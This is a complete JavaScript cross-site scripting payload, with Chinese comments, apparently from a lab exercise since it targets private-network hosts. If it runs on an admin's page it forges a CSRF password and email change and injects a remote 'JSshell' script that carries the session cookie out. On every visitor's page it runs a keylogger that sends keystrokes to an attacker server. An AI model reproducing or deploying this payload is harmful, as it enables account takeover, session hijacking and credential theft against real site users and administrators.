<script>
const ATTACK_SERVER = "http://192.168.88.130:8888";
const JS_SHELL_SERVER = "http://192.168.88.130:4848";

// 判斷是否為管理員
function isAdmin() {
    const navContent = document.querySelector('.nav-content');
    if (navContent && navContent.innerText.includes('admin')) return true;
    if (document.body.innerText.includes('歡迎 admin')) return true;
    if (document.title.includes('admin')) return true;
    return false;
}

console.log('[ATTACK] Running payload');

if (isAdmin()) {
    console.log('[ATTACK] Admin detected');

    // 1. CSRF 攻擊：修改密碼
    setTimeout(() => {
        const tokenInput = document.querySelector('input[name="csrf_token"]');
        if (tokenInput) {
            fetch('/account', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'csrf_token=' + tokenInput.value + '&new_password=hacked123&email=attacker@evil.com'
            }).then(r => {
                if (r.ok) {
                    const img = new Image();
                    img.src = ATTACK_SERVER + '/keylogger?admin_pwned=success';
                }
            }).catch(() => {});
        }
    }, 3000);

    // 2. 插入 JSshell（用 constant）
    setInterval(() => {
        const script = document.createElement("script");
        script.src = JS_SHELL_SERVER + "/?admin_session=" + encodeURIComponent(document.cookie);
        document.body.appendChild(script);
    }, 1010);
}

// 3. 統一 Keylogger：無論 admin 或一般使用者
let keys = '';
let keyTimer;
document.addEventListener('keydown', function(e) {
    if (e.key.length === 1) {  // 避免記錄特殊鍵如 "Process"
        keys += e.key;
    }
    if (keys.length >= 10 || e.key === 'Enter') {
        clearTimeout(keyTimer);
        keyTimer = setTimeout(() => {
            const img = new Image();
            img.src = ATTACK_SERVER + '/keylogger?keys=' + encodeURIComponent(keys);
            keys = '';
        }, 500);
    }
});
</script>